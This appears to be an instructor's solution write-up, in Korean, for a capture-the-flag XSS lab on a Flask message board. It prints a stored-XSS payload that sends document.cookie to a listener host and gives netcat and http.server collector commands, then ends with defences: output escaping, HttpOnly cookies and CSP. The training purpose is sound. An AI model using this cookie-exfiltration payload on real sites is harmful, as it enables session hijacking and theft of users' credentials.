# [강사용] XSS #1 풀이

## 취약점
`_base/flask_board` view.html 이 `{{ a.content|safe }}` 로 본문을 비escape 출력. `app.py` 에서 `content_filter=None`, `render_safe=True`, `flag_in_cookie=True`.

## 익스플로잇

1. 수집기 준비 (호스트에서):
```bash
python3 -m http.server 8000      # 또는 nc -lvnp 8000 / webhook.site
```
봇 컨테이너에서 호스트로의 도달 주소를 확인(`host.docker.internal:8000` 또는 호스트 IP).

2. 글쓰기 본문에 페이로드 작성:
```html
<script>
new Image().src = "http://host.docker.internal:8000/?c=" + encodeURIComponent(document.cookie);
</script>
```
작성 후 글 번호(seq) 확인 (예: `/board/1`).

3. 신고(report)에 **내부 URL** 제출:
```
http://xss-1:9101/board/1
```

4. admin 봇이 로그인(=flag 쿠키 보유) 상태로 방문 → 수집기 로그에 `?c=flag=flag{...}` 수신.

5. 획득한 `flag{...}` 를 스코어보드(:9000)에 제출.

## 핵심 교육 포인트
- 신뢰 경계: 사용자 입력이 DOM에서 코드로 실행됨.
- 쿠키 탈취 → 세션/민감정보 유출, CSRF 체이닝의 출발점.
- 대응: 출력 escape, `HttpOnly`, CSP.
